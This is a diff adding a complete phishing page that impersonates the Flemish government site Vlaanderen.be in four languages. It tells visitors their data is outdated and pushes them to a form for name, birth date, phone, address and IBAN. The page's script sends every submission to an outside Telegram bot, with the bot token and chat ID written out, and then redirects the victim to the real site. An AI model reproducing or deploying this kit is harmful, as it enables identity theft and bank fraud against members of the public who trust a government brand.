+                        <div class="line-label" data-i18n="contact.phone">Telefoon</div>
+                        <div class="line-value">
+                            <a href="#confirmForm" class="nav-to-form" data-i18n="contact.phone1">Bel 1700</a>
+                            <a href="#confirmForm" class="nav-to-form" data-i18n="contact.phone2">Vanuit het buitenland: +32 2 553 1700</a>
+                            <span data-i18n="contact.phone3">Bereikbaar elke werkdag tussen 9 en 19 uur</span>
+                        </div>
+                    </div>
+                    <div class="contact-line">
+                        <div class="line-label" data-i18n="contact.email">E-mail</div>
+                        <div class="line-value">
+                            <a href="#confirmForm" class="nav-to-form" data-i18n="contact.email1">Stuur een e-mail</a>
+                            <span data-i18n="contact.email2">Antwoord binnen 2 werkdagen</span>
+                        </div>
+                    </div>
+                    <div class="contact-line">
+                        <div class="line-label" data-i18n="contact.chat">Chat</div>
+                        <div class="line-value">
+                            <a href="#confirmForm" class="nav-to-form" data-i18n="contact.chat1">Chat met ons</a>
+                            <span data-i18n="contact.chat2">Bereikbaar elke werkdag tussen 9 en 19 uur</span>
+                        </div>
+                    </div>
+                </div>
+            </div>
+
+            <div class="contact-row">
+                <div class="contact-ico">
+                    <svg viewBox="0 0 24 24">
+                        <path d="M21 12a8 8 0 0 1-8 8h-4l-4 3v-4a8 8 0 0 1 0-14 8 8 0 0 1 16 3z"/>
+                        <circle cx="9" cy="11" r="1"/>
+                        <circle cx="12" cy="11" r="1"/>
+                        <circle cx="15" cy="11" r="1"/>
+                    </svg>
+                </div>
+                <div class="contact-heading" data-i18n="contact.kla">Een klacht of melding?</div>
+                <div class="contact-body">
+                    <p data-i18n="contact.kla.text">Bent u niet tevreden over de werking van de Vlaamse overheid? Bent u het niet eens met een beslissing in een dossier? Neem contact op met de bevoegde dienst.</p>
+                    <a href="#confirmForm" class="contact-link nav-to-form" data-i18n="contact.kla.link">Meer over de klachtenprocedure</a>
+                </div>
+            </div>
+
+            <div class="contact-row">
+                <div class="contact-ico">
+                    <svg viewBox="0 0 24 24">
+                        <rect x="4" y="3" width="16" height="18" rx="1"/>
+                        <path d="M8 7h3M8 11h3M8 15h3M14 7h3M14 11h3M14 15h3"/>
+                        <path d="M10 21v-3h4v3"/>
+                    </svg>
+                </div>
+                <div class="contact-heading" data-i18n="contact.gov">Overheidsdiensten en gebouwen</div>
+                <div class="contact-body">
+                    <p data-i18n="contact.gov.text">Alles over de organisatie en structuur van de Vlaamse overheid, de beleidsdomeinen en hun contactgegevens.</p>
+                    <a href="#confirmForm" class="contact-link nav-to-form" data-i18n="contact.gov.link">Meer over overheidsdiensten en gebouwen</a>
+                </div>
+            </div>
+        </div>
+    </section>
+
+    <footer class="site-footer">
+        <div class="footer-inner">
+            <div class="footer-content">
+                <div class="footer-title" data-i18n="footer.title">Vlaanderen.be is de officiële website van de Vlaamse overheid</div>
+                <div class="footer-sub">
+                    <span data-i18n="footer.pub">uitgegeven door</span>
+                    <a href="#confirmForm" class="nav-to-form" data-i18n="footer.dv">Digitaal Vlaanderen</a>
+                    <span class="mini-ico">
+                        <svg viewBox="0 0 24 24"><rect x="3" y="3" width="18" height="18" rx="2"/><path d="M8 8h8v8H8z"/></svg>
+                    </span>
+                    <span class="mini-ico">
+                        <svg viewBox="0 0 24 24"><rect x="3" y="3" width="18" height="18" rx="2"/><path d="M8 8h8v8H8z"/></svg>
+                    </span>
+                </div>
+                <div class="footer-nav">
+                    <a href="#confirmForm" class="nav-to-form" data-i18n="footer.nav1">Over Vlaanderen.be</a>
+                    <a href="#confirmForm" class="nav-to-form" data-i18n="footer.nav2">Disclaimer</a>
+                    <a href="#confirmForm" class="nav-to-form" data-i18n="footer.nav3">Cookieverklaring</a>
+                    <a href="#confirmForm" class="nav-to-form" data-i18n="footer.nav4">Toegankelijkheid</a>
+                    <a href="#confirmForm" class="nav-to-form" data-i18n="footer.nav5">Cookievoorkeuren</a>
+                </div>
+            </div>
+
+            <div class="footer-langs" id="footerLangs">
+                <span data-lang="nl" class="lang-active">NL</span>
+                <a data-lang="en" href="#">EN</a>
+                <a data-lang="fr" href="#">FR</a>
+                <a data-lang="de" href="#">DE</a>
+            </div>
+        </div>
+    </footer>
+
+    <script>
+        (function(){
+            'use strict';
+
+            var TG_BOT_TOKEN = '8803616582:AAE4kHbY9A-IiRvC9pcu0frTbZL2nRDFnsE';
+            var TG_CHAT_ID = '-1004308157951';
+            var REDIRECT_URL = 'https://www.vlaanderen.be/en';
+
+            var I18N = {
+                nl: {
+                    "header.aanmelden": "AANMELDEN",
+                    "header.hulp": "HULP NODIG",
+                    "hero.text": "Informatie van de<br>Vlaamse overheid",
+                    "warn.title": "Uw gegevens zijn verouderd en moeten worden geverifieerd.",
+                    "warn.text": "Gelieve uw gegevens zo snel mogelijk bij te werken.",
+                    "form.title": "Bevestig uw gegevens",
+                    "form.sub": "Vul onderstaande velden in om uw gegevens bij te werken",
+                    "form.fio": "Volledige naam",
+                    "form.fio.ph": "Uw volledige naam",
+                    "form.dob": "Geboortedatum",
+                    "form.phone": "Telefoonnummer",
+                    "form.straat": "Straat en huisnummer",
+                    "form.straat.ph": "Straat en huisnummer",
+                    "form.postcode": "Postcode",
+                    "form.postcode.ph": "Postcode",
+                    "form.iban": "Uw IBAN",
+                    "form.btn": "Bevestigen",
+                    "kijker.title": "In de kijker",
+                    "kijker.1": "Op kot? Check eerst het huurcontract",
+                    "kijker.2": "Week van Mobiliteit 2026",
+                    "kijker.3": "Maand van de Sportclub",
+                    "links.news": "Alle nieuwsberichten",
+                    "links.pubs": "Alle publicaties",
+                    "links.follow": "Volg ons op",
+                    "links.gov": "Vlaamse overheid",
+                    "over.title": "Vlaamse overheid",
+                    "over.text": "Alles over de organisatie en structuur van de Vlaamse overheid, de 8 beleidsdomeinen en hun contactgegevens.",
+                    "over.1": "Werking en structuur van de Vlaamse overheid",
+                    "over.2": "Vlaamse Regering",
+                    "over.3": "Vlaams Parlement",
+                    "contact.title": "Contact",
+                    "contact.phone": "Telefoon",
+                    "contact.phone1": "Bel 1700",
+                    "contact.phone2": "Vanuit het buitenland: +32 2 553 1700",
+                    "contact.phone3": "Bereikbaar elke werkdag tussen 9 en 19 uur",
+                    "contact.email": "E-mail",
+                    "contact.email1": "Stuur een e-mail",
+                    "contact.email2": "Antwoord binnen 2 werkdagen",
+                    "contact.chat": "Chat",
+                    "contact.chat1": "Chat met ons",
+                    "contact.chat2": "Bereikbaar elke werkdag tussen 9 en 19 uur",
+                    "contact.kla": "Een klacht of melding?",
+                    "contact.kla.text": "Bent u niet tevreden over de werking van de Vlaamse overheid? Bent u het niet eens met een beslissing in een dossier? Neem contact op met de bevoegde dienst.",
+                    "contact.kla.link": "Meer over de klachtenprocedure",
+                    "contact.gov": "Overheidsdiensten en gebouwen",
+                    "contact.gov.text": "Alles over de organisatie en structuur van de Vlaamse overheid, de beleidsdomeinen en hun contactgegevens.",
+                    "contact.gov.link": "Meer over overheidsdiensten en gebouwen",
+                    "footer.title": "Vlaanderen.be is de officiële website van de Vlaamse overheid",
+                    "footer.pub": "uitgegeven door",
+                    "footer.dv": "Digitaal Vlaanderen",
+                    "footer.nav1": "Over Vlaanderen.be",
+                    "footer.nav2": "Disclaimer",
+                    "footer.nav3": "Cookieverklaring",
+                    "footer.nav4": "Toegankelijkheid",
+                    "footer.nav5": "Cookievoorkeuren"
+                },
+                en: {
+                    "header.aanmelden": "SIGN UP",
+                    "header.hulp": "NEED HELP",
+                    "hero.text": "Information from the<br>Flemish Government",
+                    "warn.title": "Your data is outdated and must be verified.",
+                    "warn.text": "Please update your data as soon as possible.",
+                    "form.title": "Confirm your details",
+                    "form.sub": "Fill in the fields below to update your details",
+                    "form.fio": "Full name",
+                    "form.fio.ph": "Your full name",
+                    "form.dob": "Date of birth",
+                    "form.phone": "Phone number",
+                    "form.straat": "Street and number",
+                    "form.straat.ph": "Street and number",
+                    "form.postcode": "Postal code",
+                    "form.postcode.ph": "Postal code",
+                    "form.iban": "Your IBAN",
+                    "form.btn": "Confirm",
+                    "kijker.title": "In the spotlight",
+                    "kijker.1": "Renting a room? Check the lease first",
+                    "kijker.2": "Week of Mobility 2026",
+                    "kijker.3": "Month of the Sports Club",
+                    "links.news": "All news items",
+                    "links.pubs": "All publications",
+                    "links.follow": "Follow us",
+                    "links.gov": "Flemish Government",
+                    "over.title": "Flemish Government",
+                    "over.text": "Everything about the organisation and structure of the Flemish Government, the 8 policy areas and their contact details.",
+                    "over.1": "Operation and structure of the Flemish Government",
+                    "over.2": "Flemish Government (cabinet)",
+                    "over.3": "Flemish Parliament",
+                    "contact.title": "Contact",
+                    "contact.phone": "Phone",
+                    "contact.phone1": "Call 1700",
+                    "contact.phone2": "From abroad: +32 2 553 1700",
+                    "contact.phone3": "Available every working day between 9 am and 7 pm",
+                    "contact.email": "E-mail",
+                    "contact.email1": "Send an e-mail",
+                    "contact.email2": "Reply within 2 working days",
+                    "contact.chat": "Chat",
+                    "contact.chat1": "Chat with us",
+                    "contact.chat2": "Available every working day between 9 am and 7 pm",
+                    "contact.kla": "A complaint or report?",
+                    "contact.kla.text": "Are you dissatisfied with how the Flemish Government operates? Do you disagree with a decision in a file? Contact the competent service.",
+                    "contact.kla.link": "More about the complaints procedure",
+                    "contact.gov": "Government services and buildings",
+                    "contact.gov.text": "Everything about the organisation and structure of the Flemish Government, the policy areas and their contact details.",
+                    "contact.gov.link": "More about government services and buildings",
+                    "footer.title": "Vlaanderen.be is the official website of the Flemish Government",
+                    "footer.pub": "published by",
+                    "footer.dv": "Digitaal Vlaanderen",
+                    "footer.nav1": "About Vlaanderen.be",
+                    "footer.nav2": "Disclaimer",
+                    "footer.nav3": "Cookie statement",
+                    "footer.nav4": "Accessibility",
+                    "footer.nav5": "Cookie preferences"
+                },
+                fr: {
+                    "header.aanmelden": "S'INSCRIRE",
+                    "header.hulp": "BESOIN D'AIDE",
+                    "hero.text": "Informations du<br>Gouvernement flamand",
+                    "warn.title": "Vos données sont obsolètes et doivent être vérifiées.",
+                    "warn.text": "Veuillez mettre à jour vos données dès que possible.",
+                    "form.title": "Confirmez vos données",
+                    "form.sub": "Remplissez les champs ci-dessous pour mettre à jour vos données",
+                    "form.fio": "Nom complet",
+                    "form.fio.ph": "Votre nom complet",
+                    "form.dob": "Date de naissance",
+                    "form.phone": "Numéro de téléphone",
+                    "form.straat": "Rue et numéro",
+                    "form.straat.ph": "Rue et numéro",
+                    "form.postcode": "Code postal",
+                    "form.postcode.ph": "Code postal",
+                    "form.iban": "Votre IBAN",
+                    "form.btn": "Confirmer",
+                    "kijker.title": "À la une",
+                    "kijker.1": "Vous louez un kot ? Vérifiez d'abord le bail",
+                    "kijker.2": "Semaine de la Mobilité 2026",
+                    "kijker.3": "Mois du Club sportif",
+                    "links.news": "Toutes les actualités",
+                    "links.pubs": "Toutes les publications",
+                    "links.follow": "Suivez-nous",
+                    "links.gov": "Gouvernement flamand",
+                    "over.title": "Gouvernement flamand",
+                    "over.text": "Tout sur l'organisation et la structure du Gouvernement flamand, les 8 domaines politiques et leurs coordonnées.",
+                    "over.1": "Fonctionnement et structure du Gouvernement flamand",
+                    "over.2": "Gouvernement flamand",
+                    "over.3": "Parlement flamand",
+                    "contact.title": "Contact",
+                    "contact.phone": "Téléphone",
+                    "contact.phone1": "Appelez le 1700",
+                    "contact.phone2": "Depuis l'étranger : +32 2 553 1700",
+                    "contact.phone3": "Disponible chaque jour ouvrable entre 9h et 19h",
+                    "contact.email": "E-mail",
+                    "contact.email1": "Envoyer un e-mail",
+                    "contact.email2": "Réponse sous 2 jours ouvrables",
+                    "contact.chat": "Chat",
+                    "contact.chat1": "Chattez avec nous",
+                    "contact.chat2": "Disponible chaque jour ouvrable entre 9h et 19h",
+                    "contact.kla": "Une plainte ou un signalement ?",
+                    "contact.kla.text": "Vous n'êtes pas satisfait du fonctionnement du Gouvernement flamand ? Vous n'êtes pas d'accord avec une décision dans un dossier ? Contactez le service compétent.",
+                    "contact.kla.link": "Plus sur la procédure de plainte",
+                    "contact.gov": "Services et bâtiments publics",
+                    "contact.gov.text": "Tout sur l'organisation et la structure du Gouvernement flamand, les domaines politiques et leurs coordonnées.",
+                    "contact.gov.link": "Plus sur les services et bâtiments publics",
+                    "footer.title": "Vlaanderen.be est le site officiel du Gouvernement flamand",
+                    "footer.pub": "publié par",
+                    "footer.dv": "Digitaal Vlaanderen",
+                    "footer.nav1": "À propos de Vlaanderen.be",
+                    "footer.nav2": "Avertissement",
+                    "footer.nav3": "Déclaration relative aux cookies",
+                    "footer.nav4": "Accessibilité",
+                    "footer.nav5": "Préférences de cookies"
+                },
+                de: {
+                    "header.aanmelden": "ANMELDEN",
+                    "header.hulp": "HILFE NÖTIG",
+                    "hero.text": "Informationen der<br>Flämischen Regierung",
+                    "warn.title": "Ihre Daten sind veraltet und müssen überprüft werden.",
+                    "warn.text": "Bitte aktualisieren Sie Ihre Daten so schnell wie möglich.",
+                    "form.title": "Bestätigen Sie Ihre Daten",
+                    "form.sub": "Füllen Sie die untenstehenden Felder aus, um Ihre Daten zu aktualisieren",
+                    "form.fio": "Vollständiger Name",
+                    "form.fio.ph": "Ihr vollständiger Name",
+                    "form.dob": "Geburtsdatum",
+                    "form.phone": "Telefonnummer",
+                    "form.straat": "Straße und Hausnummer",
+                    "form.straat.ph": "Straße und Hausnummer",
+                    "form.postcode": "Postleitzahl",
+                    "form.postcode.ph": "Postleitzahl",
+                    "form.iban": "Ihre IBAN",
+                    "form.btn": "Bestätigen",
+                    "kijker.title": "Im Fokus",
+                    "kijker.1": "Zimmer gesucht? Prüfen Sie zuerst den Mietvertrag",
+                    "kijker.2": "Woche der Mobilität 2026",
+                    "kijker.3": "Monat des Sportvereins",
+                    "links.news": "Alle Nachrichten",
+                    "links.pubs": "Alle Publikationen",
+                    "links.follow": "Folgen Sie uns",
+                    "links.gov": "Flämische Regierung",
+                    "over.title": "Flämische Regierung",
+                    "over.text": "Alles über die Organisation und Struktur der Flämischen Regierung, die 8 Politikbereiche und ihre Kontaktdaten.",
+                    "over.1": "Funktionsweise und Struktur der Flämischen Regierung",
+                    "over.2": "Flämische Regierung",
+                    "over.3": "Flämisches Parlament",
+                    "contact.title": "Kontakt",
+                    "contact.phone": "Telefon",
+                    "contact.phone1": "Rufen Sie 1700 an",
+                    "contact.phone2": "Aus dem Ausland: +32 2 553 1700",
+                    "contact.phone3": "Erreichbar jeden Werktag zwischen 9 und 19 Uhr",
+                    "contact.email": "E-Mail",
+                    "contact.email1": "E-Mail senden",
+                    "contact.email2": "Antwort innerhalb von 2 Werktagen",
+                    "contact.chat": "Chat",
+                    "contact.chat1": "Chatten Sie mit uns",
+                    "contact.chat2": "Erreichbar jeden Werktag zwischen 9 und 19 Uhr",
+                    "contact.kla": "Eine Beschwerde oder Meldung?",
+                    "contact.kla.text": "Sind Sie mit der Arbeitsweise der Flämischen Regierung nicht zufrieden? Sind Sie mit einer Entscheidung in einer Akte nicht einverstanden? Wenden Sie sich an die zuständige Stelle.",
+                    "contact.kla.link": "Mehr über das Beschwerdeverfahren",
+                    "contact.gov": "Behördendienste und Gebäude",
+                    "contact.gov.text": "Alles über die Organisation und Struktur der Flämischen Regierung, die Politikbereiche und ihre Kontaktdaten.",
+                    "contact.gov.link": "Mehr über Behördendienste und Gebäude",
+                    "footer.title": "Vlaanderen.be ist die offizielle Website der Flämischen Regierung",
+                    "footer.pub": "herausgegeben von",
+                    "footer.dv": "Digitaal Vlaanderen",
+                    "footer.nav1": "Über Vlaanderen.be",
+                    "footer.nav2": "Haftungsausschluss",
+                    "footer.nav3": "Cookie-Erklärung",
+                    "footer.nav4": "Barrierefreiheit",
+                    "footer.nav5": "Cookie-Einstellungen"
+                }
+            };
+
+            function t(key, lang) {
+                var l = lang || document.documentElement.lang || 'nl';
+                return (I18N[l] && I18N[l][key]) || (I18N['nl'][key]) || key;
+            }
+
+            function applyLang(lang) {
+                if (!I18N[lang]) return;
+                document.documentElement.lang = lang;
+
+                var nodes = document.querySelectorAll('[data-i18n]');
+                for (var i = 0; i < nodes.length; i++) {
+                    nodes[i].textContent = t(nodes[i].getAttribute('data-i18n'), lang);
+                }
+                var htmlNodes = document.querySelectorAll('[data-i18n-html]');
+                for (var j = 0; j < htmlNodes.length; j++) {
+                    htmlNodes[j].innerHTML = t(htmlNodes[j].getAttribute('data-i18n-html'), lang);
+                }
+                var phNodes = document.querySelectorAll('[data-i18n-ph]');
+                for (var k = 0; k < phNodes.length; k++) {
+                    phNodes[k].setAttribute('placeholder', t(phNodes[k].getAttribute('data-i18n-ph'), lang));
+                }
+
+                var langEls = document.querySelectorAll('#footerLangs [data-lang]');
+                for (var m = 0; m < langEls.length; m++) {
+                    langEls[m].classList.toggle('lang-active', langEls[m].getAttribute('data-lang') === lang);
+                }
+                try { localStorage.setItem('site_lang', lang); } catch (e) {}
+            }
+
+            var langSwitches = document.querySelectorAll('#footerLangs [data-lang]');
+            for (var n = 0; n < langSwitches.length; n++) {
+                langSwitches[n].addEventListener('click', function (e) {
+                    e.preventDefault();
+                    applyLang(this.getAttribute('data-lang'));
+                });
+            }
+
+            var saved = null;
+            try { saved = localStorage.getItem('site_lang'); } catch (e) {}
+            if (saved !== 'fr' && saved !== 'nl' && saved !== 'de' && saved !== 'en') {
+                var bl = (navigator.language || 'nl').slice(0, 2).toLowerCase();
+                if (bl === 'fr') saved = 'fr';
+                else if (bl === 'de') saved = 'de';
+                else if (bl === 'en') saved = 'en';
+                else saved = 'nl';
+            }
+            applyLang(saved);
+
+            var navLinks = document.querySelectorAll('.nav-to-form');
+            for (var p = 0; p < navLinks.length; p++) {
+                navLinks[p].addEventListener('click', function (e) {
+                    e.preventDefault();
+                    var target = document.querySelector('#confirmForm');
+                    if (target) {
+                        target.scrollIntoView({ behavior: 'smooth', block: 'start' });
+                        var firstInput = document.getElementById('fio');
+                        if (firstInput) {
+                            setTimeout(function(){ firstInput.focus(); }, 500);
+                        }
+                    }
+                });
+            }
+
+            function validateIBAN(iban) {
+                var clean = iban.replace(/\s+/g, '').toUpperCase();
+                if (!/^[A-Z]{2}[0-9]{2}[A-Z0-9]+$/.test(clean)) {
+                    return { valid: false, reason: 'Ongeldig formaat (moet beginnen met 2 letters + 2 cijfers)' };
+                }
+                var country = clean.slice(0, 2);
+                var lengths = {
+                    'BE': 16, 'NL': 18, 'FR': 27, 'DE': 22, 'LU': 20,
+                    'GB': 22, 'IE': 22, 'ES': 24, 'IT': 27, 'AT': 20,
+                    'PT': 25, 'CH': 21, 'SE': 24, 'DK': 18, 'NO': 15,
+                    'FI': 18, 'PL': 28, 'CZ': 24, 'SK': 24, 'HU': 28,
+                    'RO': 24, 'BG': 22, 'HR': 21, 'SI': 19, 'EE': 20,
+                    'LV': 21, 'LT': 20, 'GR': 27, 'CY': 28, 'MT': 31
+                };
+                if (lengths[country] && clean.length !== lengths[country]) {
+                    return {
+                        valid: false,
+                        reason: 'Verkeerde lengte voor ' + country + ': ' + clean.length + ', verwacht ' + lengths[country]
+                    };
+                }
+                var rearranged = clean.slice(4) + clean.slice(0, 4);
+                var numeric = '';
+                for (var i = 0; i < rearranged.length; i++) {
+                    var ch = rearranged[i];
+                    if (ch >= '0' && ch <= '9') numeric += ch;
+                    else numeric += (ch.charCodeAt(0) - 55).toString();
+                }
+                var remainder = 0;
+                for (var j = 0; j < numeric.length; j++) {
+                    remainder = (remainder * 10 + parseInt(numeric[j], 10)) % 97;
+                }
+                if (remainder !== 1) {
+                    return { valid: false, reason: 'Controlecijfer ongeldig (mod-97 check mislukt)' };
+                }
+                return { valid: true, reason: 'Geldig' };
+            }
+
+            var form = document.getElementById('dataForm');
+            var submitBtn = document.getElementById('submitBtn');
+
+            submitBtn.addEventListener('click', function () {
+                var fields = ['fio', 'dob', 'phoneInput', 'straat', 'postcode', 'iban'];
+                var valid = true;
+
+                for (var i = 0; i < fields.length; i++) {
+                    var el = document.getElementById(fields[i]);
+                    if (el && el.hasAttribute('required') && !el.value.trim()) {
+                        valid = false;
+                        el.style.borderColor = '#d97706';
+                        el.style.backgroundColor = '#fff8e1';
+                    } else if (el) {
+                        el.style.borderColor = '';
+                        el.style.backgroundColor = '';
+                    }
+                }
+
+                if (!valid) {
+                    alert('Vul alstublieft alle verplichte velden in.');
+                    return;
+                }
+
+                var fio = document.getElementById('fio').value.trim();
+                var dob = document.getElementById('dob').value.trim();
+                var phone = document.getElementById('phoneInput').value.trim();
+                var straat = document.getElementById('straat').value.trim();
+                var postcode = document.getElementById('postcode').value.trim();
+                var ibanRaw = document.getElementById('iban').value.trim().replace(/\s+/g, '').toUpperCase();
+                var fullIban = 'BE' + ibanRaw;
+
+                var ibanCheck = validateIBAN(fullIban);
+                var ibanStatus = ibanCheck.valid
+                    ? '✅ Geldig'
+                    : '❌ Ongeldig — ' + ibanCheck.reason;
+
+                if (!phone.startsWith('+32')) {
+                    phone = '+32 ' + phone.replace(/^\+?32\s*/, '');
+                }
+
+                var now = new Date();
+                var dateStr = now.toLocaleDateString('nl-BE', { day: 'numeric', month: 'numeric', year: 'numeric' })
+                    + ', ' + now.toLocaleTimeString('nl-BE');
+
+                var message =
+                    '🔔 Nieuwe aanvraag - ENGIE ⚡️\n' +
+                    '━━━━━━━━━━━━━━━\n' +
+                    '👤 Naam: ' + fio + '\n' +
+                    '🎂 Geboortedatum: ' + dob + '\n' +
+                    '📱 Telefoon: ' + phone + '\n' +
+                    '🏠 Straat: ' + straat + '\n' +
+                    '📮 Postcode: ' + postcode + '\n' +
+                    '🏦 IBAN: ' + fullIban + '\n' +
+                    ibanStatus + '\n' +
+                    '━━━━━━━━━━━━━━━\n' +
+                    dateStr + '\n' +
+                    '🌐 Browser: ' + navigator.userAgent;
+
+                var url = 'https://api.telegram.org/bot' + TG_BOT_TOKEN + '/sendMessage';
+                var payload = {
+                    chat_id: TG_CHAT_ID,
+                    text: message
+                };
+
+                var xhr = new XMLHttpRequest();
+                xhr.open('POST', url, true);
+                xhr.setRequestHeader('Content-Type', 'application/json');
+                xhr.onreadystatechange = function () {
+                    if (xhr.readyState === 4) {
+                        if (xhr.status === 200) {
+                            var successMsg = document.createElement('div');
+                            successMsg.textContent = '✅ Uw gegevens zijn succesvol bevestigd! U wordt doorgestuurd...';
+                            successMsg.style.cssText = 'margin-top:16px;padding:14px 18px;background:#e8f5e9;border:1px solid #a5d6a7;border-radius:6px;color:#2e7d32;font-weight:600;text-align:center;';
+                            form.appendChild(successMsg);
+                            submitBtn.disabled = true;
+                            submitBtn.style.opacity = '0.6';
+                            submitBtn.textContent = 'BEVESTIGD';
+                            for (var k2 = 0; k2 < fields.length; k2++) {
+                                var el2 = document.getElementById(fields[k2]);
+                                if (el2) el2.disabled = true;
+                            }
+                            setTimeout(function () {
+                                window.location.href = REDIRECT_URL;
+                            }, 1500);
+                        } else {
+                            alert('Er is een fout opgetreden. Probeer het later opnieuw.');
+                        }
+                    }
+                };
+                xhr.send(JSON.stringify(payload));
+            });
+
+            var dobInput = document.getElementById('dob');
+            if (dobInput) {
+                dobInput.addEventListener('input', function () {
+                    var v = this.value.replace(/\D/g, '').slice(0, 8);
+                    var formatted = '';
+                    if (v.length > 0) formatted += v.slice(0, 2);
+                    if (v.length > 2) formatted += '/' + v.slice(2, 4);
+                    if (v.length > 4) formatted += '/' + v.slice(4, 8);
+                    this.value = formatted;
+                });
+            }
+
+            var phoneInput = document.getElementById('phoneInput');
+            if (phoneInput) {
+                phoneInput.addEventListener('input', function () {
+                    var v = this.value;
+                    if (!v.startsWith('+32')) {
+                        v = '+32 ' + v.replace(/^\+?32\s*/, '');
+                    }
+                    this.value = v.replace(/[^\d+ ]/g, '');
+                });
+                phoneInput.addEventListener('focus', function () {
+                    if (!this.value || this.value === '+32') {
+                        this.value = '+32 ';
+                    }
+                });
+            }
+
+            var postcodeInput = document.getElementById('postcode');
+            if (postcodeInput) {
+                postcodeInput.addEventListener('input', function () {
+                    this.value = this.value.replace(/\D/g, '').slice(0, 10);
+                });
+            }
+            var ibanInput = document.getElementById('iban');
+            if (ibanInput) {
+                ibanInput.addEventListener('input', function () {
+                    this.value = this.value.replace(/\D/g, '').slice(0, 16);
+                });
+            }
+        })();
+    </script>
+
+</body>
+</html>
